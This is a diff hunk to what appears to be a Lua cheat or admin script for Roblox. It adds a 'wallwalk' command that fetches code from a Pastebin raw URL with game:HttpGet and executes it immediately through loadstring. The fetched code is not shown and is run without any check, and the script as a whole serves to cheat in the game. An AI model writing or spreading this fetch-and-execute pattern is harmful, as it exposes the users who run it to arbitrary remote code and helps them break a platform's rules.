@@ -9286,6 +9286,10 @@ target = getPlr(Username)
 					});
 					game.CoreGui.PurchasePrompt.Enabled = true
 				end)
+				
+				cmd.add({"wallwalk"}, {"wallwalk", "Makes you walk on walls"}, function()
+loadstring(game:HttpGet("https://pastebin.com/raw/s4FjP97j"))()
+end)
 
 cmd.add({"size"}, {"size", "Makes you big"}, function()
     local LocalPlayer = game:GetService("Players").LocalPlayer
